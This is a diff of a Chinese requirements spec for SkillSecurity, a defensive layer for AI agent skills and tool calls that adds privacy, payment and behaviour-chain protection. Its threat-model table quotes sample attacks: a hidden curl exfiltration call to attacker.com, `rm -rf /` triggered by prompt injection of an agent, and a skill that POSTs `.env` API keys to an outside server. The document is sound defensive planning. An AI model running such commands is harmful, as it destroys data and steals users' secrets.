@@ -1,8 +1,8 @@
 # SkillSecurity 需求规格说明书
 
-> **版本**: 0.2.0  
+> **版本**: 0.4.0  
 > **日期**: 2026-03-11  
-> **状态**: Draft (Revised)
+> **状态**: Draft (Revised — 新增聊天记录隐私保护)
 
 ---
 
@@ -10,7 +10,7 @@
 
 **一句话描述：**
 
-为 AI Agent 的 Skill/工具调用提供一键启用的安全防护层——Skill 的"杀毒软件"。
+为 AI Agent 的 Skill/工具调用提供一键启用的安全防护套件——保护系统不被搞坏，保护数据不被偷走，保护钱包不被掏空。
 
 **要解决的核心问题：**
 
@@ -18,13 +18,24 @@
 
 - Skill 可执行高危操作（删文件、执行命令、发通知、访问网络），但无人审查
 - 恶意或有缺陷的 Skill 可以越权操作，没有权限边界
+- **Skill 可以读取用户的 API Key、Token、密钥等敏感数据并外发到远程服务器**
+- **Skill 可以在用户不知情的情况下执行购买、订阅、支付等财务操作**
+- **多步骤的隐蔽行为链无法被单次调用检查发现（先读取再外发）**
 - 现有安全方案聚焦内容过滤（guardrails），不关注工具调用安全
 - 开发者安装第三方 Skill 时无法评估其安全性
 - 企业部署缺乏审计、合规、权限控制能力
 
 **产品定位：**
 
-SkillSecurity = **静态扫描（安装前）** + **权限声明（安装时）** + **运行时拦截（执行时）** + **审计追溯（执行后）**
+SkillSecurity = **静态扫描（安装前）** + **权限声明（安装时）** + **运行时拦截（执行时）** + **隐私保护（数据层）** + **审计追溯（执行后）**
+
+三大防护维度：
+
+| 维度 | 核心问题 | 防护目标 |
+|---|---|---|
+| **系统安全** | Skill 会不会搞坏我的系统？ | 防止文件删除、命令注入、系统破坏 |
+| **隐私安全** | Skill 会不会偷走我的数据？ | 防止 API Key 泄露、PII 外发、代码窃取、聊天记录泄露 |
+| **财务安全** | Skill 会不会花掉我的钱？ | 防止未授权购买、支付、订阅、云资源创建 |
 
 类比传统安全体系：
 
@@ -33,6 +44,9 @@ SkillSecurity = **静态扫描（安装前）** + **权限声明（安装时）*
 | 杀毒软件（静态扫描） | Skill 安装前代码扫描 |
 | 应用权限系统（Android/iOS） | Skill 权限声明与用户确认 |
 | 防火墙（运行时拦截） | 工具调用实时策略拦截 |
+| 数据防泄漏（DLP） | 出站数据内容检查与敏感数据分类 |
+| 交易安全（支付确认） | 财务操作强制用户确认 |
+| 行为分析（EDR） | 跨调用行为链检测 |
 | 安全审计日志 | 操作记录与合规追溯 |
 
 **产品分层：**
@@ -49,14 +63,18 @@ SkillSecurity = **静态扫描（安装前）** + **权限声明（安装时）*
 
 > 详见 [docs/threat-model.md](docs/threat-model.md)
 
-SkillSecurity 需要防御的四类威胁：
+SkillSecurity 需要防御的七类威胁：
 
 | 威胁类型 | 描述 | 典型场景 | 主要防御手段 |
 |---|---|---|---|
-| **恶意 Skill** | 开发者有意植入后门 | Skill 代码中隐藏 `os.system("curl attacker.com/steal?data=...")` | 静态扫描 + 权限声明 |
-| **缺陷 Skill** | 代码 bug 导致越权 | 路径拼接错误，本想写 `/tmp/out` 却写了 `/etc/passwd` | 运行时拦截 + 权限边界 |
-| **Prompt Injection** | Agent 被注入恶意指令 | 用户输入诱导 Agent 调用 Skill 执行 `rm -rf /` | 运行时拦截 + 行为监控 |
-| **供应链攻击** | Skill 依赖被篡改 | Skill 依赖的第三方库被注入恶意代码 | 静态扫描 + 依赖审计 |
+| **T1 恶意 Skill** | 开发者有意植入后门 | Skill 代码中隐藏 `os.system("curl attacker.com/steal?data=...")` | 静态扫描 + 权限声明 |
+| **T2 缺陷 Skill** | 代码 bug 导致越权 | 路径拼接错误，本想写 `/tmp/out` 却写了 `/etc/passwd` | 运行时拦截 + 权限边界 |
+| **T3 Prompt Injection** | Agent 被注入恶意指令 | 用户输入诱导 Agent 调用 Skill 执行 `rm -rf /` | 运行时拦截 + 行为监控 |
+| **T4 供应链攻击** | Skill 依赖被篡改 | Skill 依赖的第三方库被注入恶意代码 | 静态扫描 + 依赖审计 |
+| **T5 隐私数据泄露** | Skill 外发敏感数据 | Skill 读取 `.env` 中的 API Key 通过网络 POST 到外部 | 数据分类 + 出站检查 |
+| **T6 未授权财务操作** | Skill 执行涉及金钱的操作 | Skill 调用支付 API 扣款或在浏览器中下单 | 财务 API 识别 + 强制确认 |
+| **T7 行为链攻击** | 多步合法调用组合成恶意行为 | 先读取密钥文件，再 POST 到未知域名 | 会话行为追踪 + 行为链规则 |
+| **T8 聊天记录泄露** | Skill 窃取或外发用户对话历史 | Skill 读取聊天记录文件并 POST 到外部，或在消息中附带完整对话上下文 | 聊天数据检测 + 文件保护 + 出站检查 |
 
 ---
 
@@ -145,29 +163,37 @@ SkillSecurity 需要防御的四类威胁：
 | F3 | 决策与执行 | Allow / Block / Ask 三种决策 |
 | F14 | CLI 输出 | 终端实时显示拦截结果和风险提示 |
 
-### Phase 2：权限声明与审计（4 周）
+### Phase 2：权限声明、隐私保护与审计（5 周）
 
 > 详见 [docs/phase-2-permission-and-audit.md](docs/phase-2-permission-and-audit.md)
 
-**目标**：Skill 有权限边界，操作可追溯
+**目标**：Skill 有权限边界，隐私数据有保护，财务操作有确认，操作可追溯
 
 | ID | 功能 | 描述 |
 |---|---|---|
 | F12 | Skill 权限声明 | skill-manifest.json 声明所需权限 |
 | F15 | Skill 静态扫描 | 安装前扫描代码中的危险模式 |
 | F4 | 审计日志 | 记录所有工具调用和决策 |
+| F19 | 数据分类引擎 | 自动识别 API Key、Token、PII 等敏感数据类型 |
+| F20 | 出站数据检查 | 检查网络请求 payload 是否携带敏感数据 |
+| F21 | 域名信誉库 | 内置安全域名白名单 + 未知域名首次外发触发确认 |
+| F22 | 财务操作识别 | 识别支付/购买/订阅类操作并强制用户确认 |
+| F29 | 聊天记录保护 | 检测对话数据结构、保护聊天文件、拦截聊天记录外发 |
 
-### Phase 3：多框架 SDK 与生态（4 周）
+### Phase 3：行为链检测、多框架 SDK 与生态（5 周）
 
 > 详见 [docs/phase-3-sdk-and-ecosystem.md](docs/phase-3-sdk-and-ecosystem.md)
 
-**目标**：主流框架可快速集成
+**目标**：主流框架可快速集成，跨调用行为链可检测
 
 | ID | 功能 | 描述 |
 |---|---|---|
 | F6 | 多框架适配 | Python SDK / Node.js SDK / REST API |
-| F8 | 策略模板库 | 开箱即用的安全策略模板 |
+| F8 | 策略模板库 | 开箱即用的安全策略模板（含隐私保护模板） |
 | F16 | 社区规则共享 | 社区贡献的规则包和威胁特征库 |
+| F23 | 会话行为追踪 | 维护每个 Skill/Session 的操作序列，跨调用分析 |
+| F24 | 行为链规则引擎 | 定义多步骤关联规则（如"读取后外发"检测） |
+| F25 | 动态风险评分 | 根据会话上下文动态调整每次调用的风险等级 |
 
 ### Phase 4：告警与用户交互（4 周）
 
@@ -192,6 +218,9 @@ SkillSecurity 需要防御的四类威胁：
 | F13 | 性能优化 | Pro |
 | F17 | 沙箱预执行 | Enterprise |
 | F18 | SSO / GDPR | Enterprise |
+| F26 | LLM 辅助意图分析 | Pro |
+| F27 | 网络沙箱/代理隔离 | Enterprise |
+| F28 | 异常基线检测 | Enterprise |
 
 ---
 
@@ -262,10 +291,10 @@ SkillSecurity 需要防御的四类威胁：
 | 里程碑 | 周期 | 产出 |
 |---|---|---|
 | Phase 1 MVP | 第 1-4 周 | 核心拦截可用 |
-| Phase 2 | 第 5-8 周 | 权限 + 审计 |
-| Phase 3 | 第 9-12 周 | SDK + 生态 |
-| Phase 4 | 第 13-16 周 | 告警 + 交互 |
-| v1.0.0 | 第 16 周 | 正式发布 |
+| Phase 2 | 第 5-9 周 | 权限 + 隐私保护 + 财务安全 + 审计 |
+| Phase 3 | 第 10-14 周 | 行为链检测 + SDK + 生态 |
+| Phase 4 | 第 15-18 周 | 告警 + 交互 |
+| v1.0.0 | 第 18 周 | 正式发布 |
 
 ---
 
@@ -275,9 +304,12 @@ SkillSecurity 需要防御的四类威胁：
 
 | 指标 | 目标 | 测量方式 |
 |---|---|---|
-| 拦截准确率 | ≥ 99% 危险操作被拦截 | 测试集验证 |
+| 系统危险操作拦截率 | ≥ 99% 危险操作被拦截 | 测试集验证 |
+| 隐私数据外泄拦截率 | ≥ 95% 含敏感数据的出站请求被检出 | 测试集验证 |
+| 聊天记录保护率 | ≥ 95% 含对话数据的出站请求被检出 | 测试集验证 |
+| 财务操作识别率 | ≥ 99% 支付/购买类操作被拦截确认 | 测试集验证 |
 | 误报率 | < 1% 正常操作被误拦 | 用户反馈 |
-| 延迟开销 | < 10ms 每次检查 | 性能测试 |
+| 延迟开销 | < 10ms 每次检查（含数据分类） | 性能测试 |
 | 框架支持 | ≥ 3 个主流框架（v1.0） | 集成测试 |
 
 ### 8.2 社区指标（6 个月）
@@ -293,9 +325,26 @@ SkillSecurity 需要防御的四类威胁：
 
 ## 9. 用户故事
 
+**系统安全：**
 - **US1**：作为个人开发者，我希望 5 分钟内启用安全防护，不用担心 Agent 误操作
 - **US2**：作为 Skill 开发者，我希望声明我的 Skill 只需要网络读取权限，证明它是安全的
 - **US3**：作为框架维护者，我希望 3 行代码集成 SkillSecurity
+
+**隐私安全：**
+- **US7**：作为用户，我担心某个 Skill 偷偷把我的 OpenAI API Key 发送到外部服务器，我希望 SkillSecurity 在检测到出站请求中携带密钥时自动拦截
+- **US8**：作为用户，我希望当一个 Skill 先读取了我的 `.env` 文件、紧接着又要发网络请求时，系统能发现这个可疑行为链并要求我确认
+- **US9**：作为用户，我希望 Skill 首次向一个陌生域名发送数据时，必须经过我的确认
+
+**聊天记录保护：**
+- **US12**：作为用户，我担心某个 Skill 偷偷读取我的聊天记录并外发到远程服务器，我希望 SkillSecurity 在检测到出站请求中携带对话数据时自动拦截
+- **US13**：作为用户，我希望任何 Skill 访问我的聊天记录文件（如 `chat_history.json`、`conversations.db`、聊天应用数据目录）时，必须经过我的确认
+- **US14**：作为用户，我希望当一个 Skill 通过消息通道发送包含大量对话历史的内容时，系统能发现并要求我确认
+
+**财务安全：**
+- **US10**：作为用户，我希望任何涉及支付、购买、订阅的操作都必须经过我的明确确认，不允许任何 Skill 绕过
+- **US11**：作为用户，我希望 SkillSecurity 能识别出 Skill 在浏览器中自动下单的行为并拦截
+
+**审计与合规：**
 - **US4**：作为企业安全管理员，我希望查询过去 30 天所有危险操作做合规审计
 - **US5**：作为运维人员，我希望凌晨有危险操作时收到通知及时响应
 - **US6**：作为高级用户，我希望自定义安全策略适配特殊需求
@@ -306,10 +355,11 @@ SkillSecurity 需要防御的四类威胁：
 
 | 文档 | 路径 | 内容 |
 |---|---|---|
-| 威胁模型 | [docs/threat-model.md](docs/threat-model.md) | 四类威胁详细分析与防御策略 |
-| 架构概述 | [docs/architecture-overview.md](docs/architecture-overview.md) | 系统架构、集成模式、技术选型 |
+| 威胁模型 | [docs/threat-model.md](docs/threat-model.md) | 八类威胁详细分析与防御策略（含隐私/聊天记录/财务/行为链） |
+| 架构概述 | [docs/architecture-overview.md](docs/architecture-overview.md) | 系统架构、集成模式、技术选型（含隐私保护层） |
+| 数据分类引擎 | [docs/data-classification-engine.md](docs/data-classification-engine.md) | 敏感数据识别、出站检查、域名信誉详细方案 |
 | Phase 1 | [docs/phase-1-core-interception.md](docs/phase-1-core-interception.md) | 核心拦截引擎功能详细需求 |
-| Phase 2 | [docs/phase-2-permission-and-audit.md](docs/phase-2-permission-and-audit.md) | 权限声明与审计日志详细需求 |
-| Phase 3 | [docs/phase-3-sdk-and-ecosystem.md](docs/phase-3-sdk-and-ecosystem.md) | 多框架 SDK 与社区生态详细需求 |
+| Phase 2 | [docs/phase-2-permission-and-audit.md](docs/phase-2-permission-and-audit.md) | 权限声明、隐私保护与审计日志详细需求 |
+| Phase 3 | [docs/phase-3-sdk-and-ecosystem.md](docs/phase-3-sdk-and-ecosystem.md) | 行为链检测、多框架 SDK 与社区生态详细需求 |
 | Phase 4 | [docs/phase-4-alert-and-interaction.md](docs/phase-4-alert-and-interaction.md) | 告警通知与用户交互详细需求 |
 | Pro/Enterprise | [docs/tier-pro-enterprise.md](docs/tier-pro-enterprise.md) | 进阶与企业版扩展功能 |
